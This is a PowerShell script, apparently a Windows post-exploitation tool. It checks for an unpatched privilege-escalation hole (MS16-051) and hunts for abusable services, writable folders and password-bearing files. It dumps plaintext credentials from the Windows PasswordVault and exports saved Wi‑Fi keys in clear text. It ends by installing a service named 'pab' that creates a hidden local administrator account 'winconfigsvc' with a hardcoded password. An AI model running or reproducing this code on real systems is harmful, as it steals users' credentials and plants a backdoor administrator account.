#requires -version 2

Set-StrictMode -version 2

function Write-Log {
    [CmdletBinding()]  
    Param ([Parameter(Mandatory=$true)][System.IO.StreamWriter]$StreamWriter, [Parameter(Mandatory=$true)]$InfoToLog)  
    Process{    
        try{
            $StreamWriter.WriteLine("$InfoToLog")
        }
        catch {
            $_
        }
    }
}

function End-Log { 
    [CmdletBinding()]  
    Param ([Parameter(Mandatory=$true)][System.IO.StreamWriter]$StreamWriter)  
    Process{             
        $StreamWriter.Close()   
    }
}

function Find-NonUpdate {
    $windowsUpdate = new-object -com "Microsoft.Update.Searcher"
    $totalupdates = $windowsUpdate.GetTotalHistoryCount()
    $allUpdates = $windowsUpdate.QueryHistory(0,$totalUpdates)

    $OutputCollection=  @()
	$ms160051 = 1	
    foreach ($update in $allUpdates) {
        $string = $update.title

        $Regex = "KB\d*"
        $KB = $string | Select-String -Pattern $regex | Select-Object { $_.Matches }           
        if($KB -eq "KB3124280") {
            $ms160051 = 0
        }
    }
    if($ms160051 -eq 0) {
        Write-Log -StreamWriter $streamWriter -InfoToLog "EOP MS016-0051 is not available"    
    }       
    else {
        Write-Log -StreamWriter $streamWriter -InfoToLog "! EOP MS016-0051 is available !"
    }
}

function Get-UsualSuspect {
[CmdletBinding()]  
    Param (
    [Parameter(Mandatory=$true)][System.IO.StreamWriter]$StreamWriter,
    [Parameter(Mandatory=$true)]$Result,
    [Parameter(Mandatory=$true)][String] $Title)

    Write-Log -StreamWriter $streamWriter -InfoToLog "`r`n$Title"    
    foreach($r in $Result){
        if($r) {
            Write-Log -StreamWriter $streamWriter -InfoToLog $r
        }
    }
}

function LookAfter-MagicFruits { 
    [CmdletBinding()] 
        param ( 
            [parameter(Mandatory=$true)] 
            [string]$XmlDirectory 
            ) 
    $wlans = netsh wlan show profiles | Select-String -Pattern "All User Profile" | Foreach-Object {$_.ToString()} 
    $exportdata = $wlans | Foreach-Object {$_.Replace("    All User Profile     : ",$null)} 
    $exportdata = $exportdata | ForEach-Object {netsh wlan export profile $_ $XmlDirectory key=clear} 
    Write-Log -StreamWriter $streamWriter -InfoToLog "$exportdata"
} 


$en = "Authenticated Users"
$fr = "Utilisateurs Authentifiés" 

$scriptPath = split-path -parent $MyInvocation.MyCommand.Definition
$scriptParentPath = split-path -parent $scriptPath
$scriptFile = $MyInvocation.MyCommand.Definition
$launchDate = get-date -f "yyyyMMddHHmmss"
$logDirectoryPath = $scriptParentPath + "\" + $launchDate
$logFileName = "Log_" + $launchDate + ".log"
$logPathName = "$logDirectoryPath\$logFileName"

$folderToLook = $scriptPath

if(!(Test-Path $logDirectoryPath)) {
    New-Item $logDirectoryPath -type directory | Out-Null
}

$streamWriter = New-Object System.IO.StreamWriter $logPathName

$white = "IFwNCiAgXCAvXCAgIEZvbGxvdyB0aGUgd2hpdGUgUmFiYml0IDotKQ0KICAoICkgICAgICAgQHBhYnJhZWtlbg0KLiggQCApLiANCg=="
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($white))

$operatingSystem = gwmi win32_operatingsystem
$operatingSystemBuild = gwmi Win32_WmiSetting | Select-Object BuildVersion  

Write-Log -StreamWriter $streamWriter -InfoToLog "Operating System: $($operatingSystem.Caption) $($operatingSystem.csdversion) $operatingSystemBuild"
Write-Log -StreamWriter $streamWriter -InfoToLog "Computer Name: $($operatingSystem.PSComputerName)"

Find-NonUpdate

$juicyFiles = Get-ChildItem -Path $folderToLook -Recurse `
-Include "*.xml","*.ps1","*.cnf","*.odf","*.conf","*.bat","*.cfg","*.ini","*.config","*.info","*.nfo","*.txt" |
Where-Object { $_.Name -match "pass" -or $_.Name -match "creds" -or $_.Name -match "crede" -or $_.Name -match "vnc"}
Get-UsualSuspect -StreamWriter $streamWriter -Result $juicyFiles -Title "Possible juicy files"

$accessCheck = &$scriptPath\tools\accesschk.exe -accepteula -ucqvw *
Get-UsualSuspect -StreamWriter $streamWriter -Result $accessCheck -Title "Possible services to abuse"

$autoRun =  &$scriptPath\tools\Autorunsc.exe -accepteula -a * | findstr /n /R "File\ not\ found"
Get-UsualSuspect -StreamWriter $streamWriter -Result $autoRun -Title "Possible places to copy a binary"

$puttySessions = reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
Get-UsualSuspect -StreamWriter $streamWriter -Result $puttySessions -Title "Putty sessions with possible proxy password"

<#
$en = "Authenticated Users"
$fr = "Utilisateurs Authentifiés" 

$acessCheck =  .\accesschk.exe -uwdqs $fr c:\
Get-UsualSuspect -StreamWriter $streamWriter -Result $acessCheck -Title "Find weak directories"
#>

$usertocheck = $en
$ntaccount = [System.Security.Principal.NTAccount]$usertocheck

try
{
    $sid = $ntaccount.Translate([System.Security.Principal.SecurityIdentifier])
}
catch
{
    throw "Could not resolve $usertocheck to a SID: $($_.Exception.Message)"
}

$basefolder = $folderToLook
$folders = Get-ChildItem $basefolder -recurse -directory | ForEach-Object {$_.fullname}
$acls = Get-Acl -path $folders

foreach ($acl in $acls){
    $folder = (Convert-Path $acl.pspath) 
    foreach($access in $acl.GetAccessRules($true, $true, [System.Security.Principal.SecurityIdentifier])){
        if ($access.IdentityReference.Value -eq $sid.Value -and $(($access.FileSystemRights).value__) -ne -536805376){
            Write-Log -StreamWriter $streamWriter -InfoToLog "$($ntaccount.Value) - $($access.AccessControlType) - $($access.FileSystemRights) ($folder)"     
        }
    }
}

$filePresenceToCheck = @()
$filePresenceToCheck += "C:\sysprep.inf"
$filePresenceToCheck += "C:\sysprep\sysprep.xml"
$filePresenceToCheck += "C:\WINDOWS\panther\Unattend\Unattended.xml"
$filePresenceToCheck += "C:\WINDOWS\panther\Unattended.xml"
Write-Log -StreamWriter $streamWriter -InfoToLog "`r`nFiles that could contain passwords"
$i = 0
foreach($file in $filePresenceToCheck) {
    if (Test-Path $file){
        Write-Log -StreamWriter $streamWriter -InfoToLog "$file is present!"
        $i++
    }
}
Write-Log -StreamWriter $streamWriter -InfoToLog "`r`n$i file(s) found"

[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
$vault = New-Object Windows.Security.Credentials.PasswordVault 
$credentials = $vault.RetrieveAll() | % { $_.RetrievePassword();$_ }
Write-Log -StreamWriter $streamWriter -InfoToLog "`r`nPasswords, passwords everywhere"
$i = 0
foreach ($credential in $credentials) {
    Write-Log -StreamWriter $streamWriter -InfoToLog "$($credential.UserName) - $($credential.Resource) -  $($credential.Password)"
    $i++
}
Write-Log -StreamWriter $streamWriter -InfoToLog "`r`n$i password(s) found"

$environmentPathVars = ($env:Path)
Get-UsualSuspect -StreamWriter $streamWriter -Result $environmentPathVars -Title "Any non-default directory is a possible win because authenticated users will have write access to these directories"

<#

accesschk.exe -uwcq * | findstr /v AUTHORITY | findstr /v Administrators


sc config badsrvc binpath="cmd /c net user winconfigsvc kill /add && net localgroup Administrators winconfigsvc /add" type=interact

sc stop badsrvc
sc start badsrvc
runas /noprofile /user:%COMPUTERNAME%\winconfigsvc cmd


&$scriptPath\tools\Instsrv.exe pab &$scriptPath\tools\Srvany.exe
sc config pab binpath="cmd /c net user winconfigsvc kill /add && net localgroup Administrators winconfigsvc /add" type=interact

#>
&$scriptPath\tools\Instsrv.exe pab $scriptPath\tools\srvany.exe
&sc.exe config pab binpath="cmd /c net user winconfigsvc killErs9! /add && net localgroup Administrators winconfigsvc /add" type=own

LookAfter-MagicFruits -XmlDirectory $scriptPath

End-Log -StreamWriter $streamWriter

Read-Host "If service pab exists, try to start it. Look into $logPathName for any intersting stuff"